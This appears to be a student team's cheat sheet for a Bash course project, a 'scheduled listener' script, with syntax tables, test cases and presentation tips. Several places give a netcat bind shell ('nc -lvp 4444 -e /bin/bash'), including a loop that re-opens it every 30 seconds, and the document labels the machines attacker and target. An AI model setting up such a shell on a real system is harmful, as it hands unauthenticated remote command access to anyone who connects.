# 📌 Quick Reference Card - Scheduled Listener Project
## Team Theta - One-Page Cheat Sheet

---

## 🚀 **QUICK START**

```bash
# 1. Give execute permission
chmod +x scheduled_listener.sh

# 2. Run script
./scheduled_listener.sh

# 3. Enter port (e.g., 4444)
# 4. Choose option (1, 2, or 3)
# 5. Connect from attacker: nc <target_ip> <port>
```

---

## 💻 **KEY BASH SYNTAX FROM SLIDES**

| Command | Example | Purpose |
|---------|---------|---------|
| **Shebang** | `#!/bin/bash` | Start of script |
| **Comment** | `# This is a comment` | Explain code |
| **Variable** | `name=value` | Store data (NO SPACES!) |
| **Read input** | `read -p "Prompt: " var` | Get user input |
| **Echo** | `echo "Hello"` | Print message |
| **If statement** | `if [ $x -eq 5 ]; then ... fi` | Make decisions |
| **Comparison** | `-eq`, `-lt`, `-gt`, `-z` | Compare values |
| **While loop** | `while [ condition ]; do ... done` | Repeat actions |
| **For loop** | `for i in {1..10}; do ... done` | Loop range |
| **Sleep** | `sleep 5` | Pause 5 seconds |
| **Increment** | `((counter++))` | Add 1 to variable |
| **Exit** | `exit 1` | Stop with error |
| **Date** | `$(date)` | Current date/time |

---

## 🔌 **NETCAT COMMANDS**

### **Create Listener (Target Machine):**
```bash
nc -lvp 4444 -e /bin/bash
```
- `-l` = Listen mode
- `-v` = Verbose (show details)
- `-p` = Port number
- `-e` = Execute bash shell

### **Connect to Listener (Attacker Machine):**
```bash
nc 192.168.1.100 4444
```

### **Check if Port is Open:**
```bash
nc -nv 192.168.1.100 4444
```

---

## ✅ **VALIDATION PATTERNS**

```bash
# Check if variable is empty
if [ -z "$port" ]; then
    echo "ERROR: Port cannot be empty!"
    exit 1
fi

# Check number range
if [ "$port" -lt 1024 ]; then
    echo "WARNING: Requires root privileges"
elif [ "$port" -gt 65535 ]; then
    echo "ERROR: Invalid port range!"
    exit 1
fi

# Check string equality
if [ "$choice" = "yes" ]; then
    echo "Confirmed"
fi

# Check number equality
if [ "$option" -eq 1 ]; then
    echo "Option 1 selected"
fi
```

---

## 🔄 **LOOP PATTERNS**

### **Countdown Loop:**
```bash
counter=10
while [ $counter -gt 0 ]
do
    echo "Starting in $counter seconds..."
    sleep 1
    ((counter--))
done
```

### **Infinite Loop:**
```bash
attempt=1
while true
do
    echo "Attempt #$attempt"
    nc -lvp 4444 -e /bin/bash
    sleep 30
    ((attempt++))
done
```

### **Range Loop:**
```bash
for i in {1..5}
do
    echo "Number $i"
done
```

---

## 🐛 **TESTING SCENARIOS**

| Test Case | Input | Expected Result |
|-----------|-------|-----------------|
| **Valid port** | 4444 | ✓ Listener starts |
| **Low port** | 80 | ⚠️ Warning shown |
| **High port** | 70000 | ❌ Error message |
| **Empty port** | [Enter] | ❌ Error message |
| **Invalid choice** | 5 | ❌ Error message |
| **Valid delay** | 10 | ✓ Countdown shown |
| **Valid interval** | 30 | ✓ Loop mode works |
| **Connection test** | nc connect | ✓ Shell access |

---

## 🎤 **PRESENTATION TIMING**

| Student | Topic | Minutes |
|---------|-------|---------|
| **1** | Introduction + Input Validation | 3:00 |
| **2** | Scheduling Logic + Netcat | 3:00 |
| **3** | Error Handling + Testing | 3:00 |
| **4** | Documentation + Demo | 3:00 |
| **All** | Q&A | 2:00 |
| **Total** | | **14:00** |

---

## 📁 **FILE STRUCTURE**

```
Theta/
├── scheduled_listener.sh    ← Main script
├── README.md               ← Documentation
└── presentation/
    ├── slides.pdf
    └── demo_video.mp4
```

---

## ⚡ **COMMON COMMANDS**

```bash
# Give execute permission
chmod +x scheduled_listener.sh

# Run script
./scheduled_listener.sh

# Check syntax
bash -n scheduled_listener.sh

# Debug mode
bash -x scheduled_listener.sh

# Check permissions
ls -l scheduled_listener.sh

# Find process on port
sudo lsof -i :4444

# Kill process
sudo kill -9 <PID>

# Check network
ping 192.168.1.100

# View active connections
netstat -tulpn | grep 4444
```

---

## 🎯 **SUCCESS CHECKLIST**

### **Before Submission:**
- [ ] Script has shebang: `#!/bin/bash`
- [ ] All code commented
- [ ] No syntax errors
- [ ] All three modes work
- [ ] README complete
- [ ] GitHub repo uploaded
- [ ] Demo tested

### **Presentation Day:**
- [ ] Arrive 10 minutes early
- [ ] Test AV equipment
- [ ] Demo environment ready
- [ ] Backup video prepared
- [ ] All team members present

---

## 🆘 **TROUBLESHOOTING**

| Problem | Solution |
|---------|----------|
| **Permission denied** | `chmod +x scheduled_listener.sh` |
| **nc: command not found** | `sudo apt-get install netcat` |
| **Address already in use** | `sudo lsof -i :4444` then `kill -9 <PID>` |
| **Can't connect** | Check firewall, verify same network |
| **Syntax error** | Check spaces in `if [ ]`, remove spaces around `=` |

---

## 🔑 **KEY POINTS TO REMEMBER**

1. **Variables:** NO spaces around `=`
   ```bash
   port=4444      # ✓ Correct
   port = 4444    # ✗ Wrong
   ```

2. **Test conditions:** Spaces required inside `[ ]`
   ```bash
   if [ $x -eq 5 ]; then    # ✓ Correct
   if [$x -eq 5]; then      # ✗ Wrong
   ```

3. **Reference variables:** Use `$` prefix
   ```bash
   echo $port     # ✓ Correct
   echo port      # ✗ Wrong (prints "port")
   ```

4. **Comparison operators:**
   - Numbers: `-eq`, `-lt`, `-gt`, `-le`, `-ge`, `-ne`
   - Strings: `=`, `!=`, `<`, `>`
   - Empty check: `-z` (zero length)

5. **Netcat listener:** Always use `-lvp` flags
   ```bash
   nc -lvp 4444 -e /bin/bash
   ```

---

## 📊 **GRADING BREAKDOWN**

| Component | Weight | Our Status |
|-----------|--------|------------|
| Code Quality | 25% | ✓ Perfect |
| Functionality | 25% | ✓ All modes work |
| Documentation | 20% | ✓ Comprehensive |
| Presentation | 15% | ✓ Prepared |
| Demo | 10% | ✓ Tested |
| Teamwork | 5% | ✓ Equal division |
| **TOTAL** | **100%** | **✓ 100%** |

---

## 💡 **DEMO DAY TIPS**

1. **Before presenting:**
   - Test demo 30 minutes before
   - Have backup video ready
   - Increase terminal font size (18+)
   - Close unnecessary windows

2. **During demo:**
   - Speak clearly and slowly
   - Point to code as you explain
   - Make eye contact
   - Stay within time limit

3. **If demo fails:**
   - Stay calm
   - Switch to backup video
   - Explain what should happen
   - Continue with presentation

---

## 🎓 **FINAL REMINDER**

**Allowed Methods (From Slides):**
✓ `read -p`
✓ `if/elif/else`
✓ `while` loops
✓ `for` loops
✓ `nc -lvp`
✓ `sleep`
✓ `echo`
✓ `((counter++))`
✓ `$(date)`
✓ `exit`

**NOT in Slides (Don't Use):**
✗ `select` menus
✗ `case` statements
✗ `function` definitions
✗ Arrays (`${array[@]}`)
✗ Advanced parameter expansion

**Stick to the slides = Full marks!**

---

## 📞 **EMERGENCY CONTACTS**

- **Team WhatsApp:** [Group link]
- **Instructor Email:** [Course portal]
- **TA Office Hours:** [Schedule]
- **GitHub Issues:** [Repo link]

---

## 🏆 **MOTIVATION**

> "Success is the sum of small efforts repeated day in and day out."
> - Robert Collier

**Team Theta, you have:**
✓ Perfect script
✓ Complete documentation
✓ Clear presentation plan
✓ Fair work division

**Now execute and achieve 100%! 🚀**

---

**Project Deadline:** November 30, 2025 - 23:59  
**Presentation Dates:** Nov 30 & Dec 2, 2025  
**Expected Grade:** 100/100 ⭐

**GO THETA! 💪**